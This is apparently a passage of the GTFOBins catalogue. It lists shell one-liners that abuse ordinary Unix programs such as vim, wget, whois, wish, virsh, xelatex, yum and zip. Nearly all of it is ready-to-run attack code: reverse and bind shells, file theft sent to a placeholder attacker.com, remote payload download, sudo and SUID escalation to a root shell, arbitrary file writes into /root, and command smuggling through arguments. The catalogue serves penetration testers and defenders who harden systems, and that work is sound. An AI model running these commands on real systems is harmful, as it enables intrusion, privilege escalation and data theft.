r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
export LPORT=8888
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vim -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vim -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
export LPORT=12345
export LFILE=file_to_save
vim -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
vim file_to_write
iDATA
^[
w
vimdiff
:set shell=/bin/sh
:shell
export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':py import vim,sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
vimdiff -c ':lua local s=require("socket"); local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
local r,x=t:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();'
export LPORT=12345
vimdiff -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
local r,x=c:receive();local f=assert(io.popen(r,"r"));
local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();'
export URL=http://attacker.com/
export LFILE=file_to_send
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))
vim.command(":q!")'
export LPORT=8888
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
vim.command(":q!")'
export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
vimdiff -c ':lua local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();'
export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
vimdiff -c ':py import vim,sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e["URL"], e["LFILE"])
vim.command(":q!")'
export LPORT=12345
export LFILE=file_to_save
vimdiff -c ':lua local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);'
vimdiff file_to_write
iDATA
^[
w
SCRIPT=script_to_run
TF=$(mktemp)
cat > $TF << EOF
<domain type='kvm'>
<name>x</name>
<os>
<type arch='x86_64'>hvm</type>
</os>
<memory unit='KiB'>1</memory>
<devices>
<interface type='ethernet'>
<script path='$SCRIPT'/>
</interface>
</devices>
</domain>
EOF
sudo virsh -c qemu:///system create $TF
virsh -c qemu:///system destroy x
LFILE_DIR=/root
LFILE_NAME=file_to_write
echo 'data' > data_to_write
TF=$(mktemp)
cat > $TF <<EOF
<volume type='file'>
<name>y</name>
<key>$LFILE_DIR/$LFILE_NAME</key>
<source>
</source>
<capacity unit='bytes'>5</capacity>
<allocation unit='bytes'>4096</allocation>
<physical unit='bytes'>5</physical>
<target>
<path>$LFILE_DIR/$LFILE_NAME</path>
<format type='raw'/>
<permissions>
<mode>0600</mode>
<owner>0</owner>
<group>0</group>
</permissions>
</target>
</volume>
EOF
virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-create --pool x --file $TF
virsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write
virsh -c qemu:///system pool-destroy x
LFILE_DIR=/root
LFILE_NAME=file_to_read
SPATH=file_to_save
virsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR
virsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH
virsh -c qemu:///system pool-destroy x
volatility -f file.dump volshell
__import__('os').system('/bin/sh')
LFILE=file_to_read
w3m "$LFILE" -dump
LFILE=file_to_read
./w3m "$LFILE" -dump
LFILE=file_to_read
sudo w3m "$LFILE" -dump
LFILE=file_to_read
sudo wall --nobanner "$LFILE"
LFILE=file_to_read
wc --files0-from "$LFILE"
LFILE=file_to_read
./wc --files0-from "$LFILE"
LFILE=file_to_read
sudo wc --files0-from "$LFILE"
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
wget --use-askpass=$TF 0
URL=http://attacker.com/
LFILE=file_to_send
wget --post-file=$LFILE $URL
LFILE=file_to_read
wget -i $LFILE
LFILE=file_to_write
TF=$(mktemp)
echo DATA > $TF
wget -i $TF -o $LFILE
URL=http://attacker.com/file_to_get
LFILE=file_to_save
wget $URL -O $LFILE
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
./wget --use-askpass=$TF 0
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
LFILE=file_to_read
whiptail --textbox --scrolltext "$LFILE" 0 0
LFILE=file_to_read
./whiptail --textbox --scrolltext "$LFILE" 0 0
LFILE=file_to_read
sudo whiptail --textbox --scrolltext "$LFILE" 0 0
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "`cat $LFILE`"
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
whois -h $RHOST -p $RPORT "`base64 $LFILE`"
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT > "$LFILE"
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
This requires GUI interaction. Start Wireshark, then from the main menu, select "Tools" -> "Lua" -> "Evaluate". A window opens that allows to execute [`lua`](/gtfobins/lua/) code.
This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.
After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:
1. select the only received packet;
2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";
3. choose where to save the packet dump.
PORT=4444
sudo wireshark -c 1 -i lo -k -f "udp port $PORT" &
echo 'DATA' | nc -u 127.127.127.127 "$PORT"
wish
exec /bin/sh <@stdin >@stdout 2>@stderr
export RHOST=attacker.com
export RPORT=12345
echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
sudo wish
exec /bin/sh <@stdin >@stdout 2>@stderr
xargs -Ix sh -c 'exec sh 0<&1'
x^D^D
LFILE=file_to_read
xargs -a "$LFILE" -0
xdg-user-dir '}; /bin/sh #'
sudo xdg-user-dir '}; /bin/sh #'
xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
strings article.dvi
sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
xetex --shell-escape '\write18{/bin/sh}\end'
sudo xetex --shell-escape '\write18{/bin/sh}\end'
./xetex --shell-escape '\write18{/bin/sh}\end'
LFILE=file_to_read
xmodmap -v $LFILE
LFILE=file_to_read
./xmodmap -v $LFILE
LFILE=file_to_read
sudo xmodmap -v $LFILE
LFILE=file_to_read
xmore $LFILE
LFILE=file_to_read
./xmore $LFILE
LFILE=file_to_read
sudo xmore $LFILE
LFILE=file_to_read
xpad -f "$LFILE"
LFILE=file_to_read
sudo xpad -f "$LFILE"
LFILE=file_to_write
echo DATA | xxd | xxd -r - "$LFILE"
LFILE=file_to_read
xxd "$LFILE" | xxd -r
LFILE=file_to_read
./xxd "$LFILE" | xxd -r
LFILE=file_to_read
sudo xxd "$LFILE" | xxd -r
LFILE=file_to_read
xz -c "$LFILE" | xz -d
LFILE=file_to_read
./xz -c "$LFILE" | xz -d
LFILE=file_to_read
sudo xz -c "$LFILE" | xz -d
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
yarn --cwd $TF install
LFILE=file_to_read
yelp "man:$LFILE"
RHOST=attacker.com
RFILE=file_to_get.rpm
yum install http://$RHOST/$RFILE
It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
TF=$(mktemp -d)
echo 'id' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```
sudo yum localinstall -y x-1.0-1.noarch.rpm
Spawn interactive root shell by loading a custom plugin.
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
sudo zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
LFILE=file-to-read
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF
TF=$(mktemp -u)
zip $TF /etc/hosts -T -TT 'sh #'
rm $TF
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
TF=$(mktemp -u)
./zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
export LFILE=file_to_read
zsh -c 'echo "$(<$LFILE)"'
export LFILE=file_to_write
zsh -c 'echo DATA >$LFILE'
LFILE=file_to_read
zsoelim "$LFILE"
LFILE=file_to_read
./zsoelim "$LFILE"
LFILE=file_to_read
sudo zsoelim "$LFILE"
zypper x
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
export PATH=$TF:$PATH
zypper x
sudo zypper x
TF=$(mktemp -d)
cp /bin/sh $TF/zypper-x
sudo PATH=$TF:$PATH zypper x
